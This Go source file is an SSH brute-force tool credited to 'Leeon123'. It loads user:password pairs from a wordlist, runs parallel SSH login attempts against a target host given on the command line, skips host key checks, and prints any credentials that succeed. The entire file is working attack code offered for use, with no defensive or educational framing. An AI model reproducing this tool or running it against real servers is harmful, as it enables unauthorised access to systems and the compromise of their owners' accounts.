/*
Code by Leeon123, simple ssh brute force
*/
package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/crypto/ssh"
)

var (
	host          = ""
	port          = "22"
	timeout       = 10
	thread_limit  = 6
	wordlist_file = "wordlist.txt"
	wordlist      []string
	delay         = 10
	succ          = make(chan bool)
	done          = 0
	threads       = 0
)

/*
func str2bytes(s string) []byte {
	x := (*[2]uintptr)(unsafe.Pointer(&s))
	h := [3]uintptr{x[0], x[1], x[1]}
	return *(*[]byte)(unsafe.Pointer(&h))
}*/
func bytes2str(s []byte) string {
	return *(*string)(unsafe.Pointer(&s))
}
func main() {
	fmt.Println(" /$$$$$$   /$$$$$$  /$$   /$$                                        /$$       ")
	fmt.Println(" /$$__  $$ /$$__  $$| $$  | $$                                       | $$      ")
	fmt.Println("| $$  \\__/| $$  \\__/| $$  | $$  /$$$$$$$  /$$$$$$  /$$$$$$   /$$$$$$$| $$   /$$")
	fmt.Println("|  $$$$$$ |  $$$$$$ | $$$$$$$$ /$$_____/ /$$__  $$|____  $$ /$$_____/| $$  /$$/")
	fmt.Println(" \\____  $$ \\____  $$| $$__  $$| $$      | $$  \\__/ /$$$$$$$| $$      | $$$$$$/ ")
	fmt.Println(" /$$  \\ $$ /$$  \\ $$| $$  | $$| $$      | $$      /$$__  $$| $$      | $$_  $$ ")
	fmt.Println("|  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$$| $$     |  $$$$$$$|  $$$$$$$| $$ \\  $$")
	fmt.Println(" \\______/  \\______/ |__/  |__/ \\_______/|__/      \\_______/ \\_______/|__/  \\__/")
	fmt.Println("================================================================================")
	args := os.Args
	var err error
	var help bool
	for k, v := range args {
		if v == "-h" {
			host = os.Args[k+1]
		}
		if v == "-p" {
			port = os.Args[k+1]
		}
		if v == "-t" {
			timeout, err = strconv.Atoi(os.Args[k+1])
			if err != nil {
				fmt.Println("-t must be a integer")
			}
		}
		if v == "-d" {
			delay, err = strconv.Atoi(os.Args[k+1])
			if err != nil {
				fmt.Println("-d must be a integer")
			}
		}
		if v == "-f" {
			wordlist_file = os.Args[k+1]
		}
		if v == "-help" {
			help = true
		}
	}
	if help || host == "" {
		fmt.Println("Usage of " + os.Args[0])
		fmt.Println("  -h : target")
		fmt.Println("  -p : port")
		fmt.Println("  -f : wordlist file")
		fmt.Println("  -t : timeout(second)")
		fmt.Println("  -d : delay")
		fmt.Println("================================================================================")
		return
	}
	fmt.Println("Target          : " + host)
	fmt.Println("Port            : " + port)
	fmt.Println("timeout         : " + strconv.Itoa(timeout))
	fmt.Println()
	fmt.Println("Loading wordlist...")
	func() {
		fi, err := os.Open(wordlist_file)
		if err != nil {
			fmt.Printf("Error: %s\n", err)
			return
		}
		defer fi.Close()
		scanner := bufio.NewScanner(fi)
		for scanner.Scan() {
			wordlist = append(wordlist, scanner.Text())
		}
		fmt.Println("Wordlist lines: " + strconv.Itoa(len(wordlist)))
	}()
	var tmp []string
	go func() {
		for {
			fmt.Printf("\r[ Tried: %6s ]", strconv.Itoa(done))
			os.Stdout.Sync()
			time.Sleep(500 * time.Millisecond)
		}
	}()
	for i := 0; i < len(wordlist); i++ {
		tmp = strings.Split(wordlist[i], ":")
		addr := host + ":" + port
		for {
			if threads < thread_limit {
				go brute_force(addr, tmp[0], tmp[1], timeout)
				threads++
				break
			} else {
				time.Sleep(50 * time.Millisecond)
			}
		}
		time.Sleep(time.Millisecond * time.Duration(delay))
	}
	println()
	<-succ
}

func brute_force(addr string, user string, pass string, timeout int) {
	sshConfig := &ssh.ClientConfig{
		User:            user,
		Auth:            []ssh.AuthMethod{ssh.Password(pass)},
		Timeout:         time.Duration(timeout) * time.Second,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}

	client, err := ssh.Dial("tcp", addr, sshConfig)
	if err != nil {
		done++
		threads--
		return
	}

	_, err = client.NewSession()
	if err != nil {
		client.Close()
		done++
		threads--
		return

	}
	done++
	threads--
	fmt.Println("====================")
	fmt.Println("User: " + user)
	fmt.Println("Pass: " + pass)
	fmt.Println("====================")
	close(succ)
	return
}
